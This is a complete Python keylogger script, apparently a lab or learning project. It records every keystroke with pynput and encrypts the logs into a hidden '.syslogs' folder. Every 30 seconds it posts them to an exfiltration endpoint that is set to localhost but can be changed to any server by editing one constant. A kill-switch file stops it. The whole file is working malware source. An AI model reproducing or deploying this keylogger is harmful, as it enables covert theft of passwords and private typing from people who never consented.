import os
import datetime
import threading
import time
from pynput import keyboard
from cryptography.fernet import Fernet
import requests

# Constants
LOG_DIR = ".syslogs"
KEY_FILE = "encryption.key"  # Make sure this matches your file name exactly
EXFIL_URL = "http://localhost:5000/exfil"

# Load encryption key
with open(KEY_FILE, "rb") as key_file:
    key = key_file.read()

fernet = Fernet(key)
log = []

def ensure_log_dir():
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)

def encrypt_and_store(log_data):
    ensure_log_dir()
    if log_data:
        print("[+] Flushing and encrypting logs...")  # Moved here
        encrypted_data = fernet.encrypt("".join(log_data).encode())
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(LOG_DIR, f"log_{timestamp}.bin")
        with open(filename, "wb") as f:
            f.write(encrypted_data)
        simulate_exfil(filename)

def simulate_exfil(filepath):
    try:
        with open(filepath, "rb") as f:
            data = f.read()
            response = requests.post(EXFIL_URL, data=data, timeout=5)
            if response.status_code == 200:
                print(f"[+] Exfiltrated {filepath} successfully.")
            else:
                print(f"[-] Exfiltration failed with status {response.status_code}")
    except Exception as e:
        print(f"[-] Exfiltration error: {e}")

def check_kill_switch():
    return os.path.exists("kill.flag")

def flush_log():
    global log
    if log:
        encrypt_and_store(log)
        log = []

def periodic_flush():
    while True:
        time.sleep(30)
        if check_kill_switch():
            flush_log()
            print("[*] Kill switch detected. Exiting.")
            exit()
        flush_log()

def on_press(key):
    try:
        log.append(str(key.char))
    except AttributeError:
        log.append(f"[{key}]")

def main():
    ensure_log_dir()
    print("[*] Logger started. Listening for keystrokes...")
    threading.Thread(target=periodic_flush, daemon=True).start()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
